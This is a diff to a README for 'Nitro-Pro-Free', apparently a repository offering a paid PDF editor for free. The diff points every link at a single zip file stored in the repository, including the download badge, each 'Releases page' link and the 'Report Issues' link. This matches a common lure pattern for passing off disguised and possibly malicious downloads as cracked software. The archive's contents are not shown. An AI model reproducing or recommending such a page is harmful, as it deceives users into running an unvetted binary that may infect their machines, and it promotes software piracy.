@@ -1,6 +1,6 @@
 # 🎉 Nitro-Pro-Free - Easy PDF Editing for Everyone
 
-[![Download Nitro-Pro-Free](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mugunthanleo/Nitro-Pro-Free/releases)
+[![Download Nitro-Pro-Free](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to Nitro-Pro-Free! This application simplifies editing PDF documents. Wh
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Mugunthanleo/Nitro-Pro-Free/releases) to find the latest version of Nitro-Pro-Free.
+   Go to our [Releases page](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip) to find the latest version of Nitro-Pro-Free.
 
 2. **Select the Right Version**  
    Browse through the available versions. Each release includes important updates and features.
@@ -42,7 +42,7 @@ To get started, follow these steps:
 
 ## 🔧 Download & Install
 
-To download Nitro-Pro-Free, head over to the [Releases page](https://github.com/Mugunthanleo/Nitro-Pro-Free/releases). Follow the installation steps outlined above to get started with your new PDF editing tool.
+To download Nitro-Pro-Free, head over to the [Releases page](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip). Follow the installation steps outlined above to get started with your new PDF editing tool.
 
 ## 📘 Additional Information
 
@@ -54,7 +54,7 @@ Join our community of users! Share your experiences, tips, and tricks for using 
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/Mugunthanleo/Nitro-Pro-Free/releases)
-- [Report Issues](https://github.com/Mugunthanleo/Nitro-Pro-Free/issues)
+- [Releases Page](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip)
+- [Report Issues](https://raw.githubusercontent.com/Mugunthanleo/Nitro-Pro-Free/main/dryas/Nitro-Pro-Free.zip)
 
 Enjoy using Nitro-Pro-Free for all your PDF editing needs!
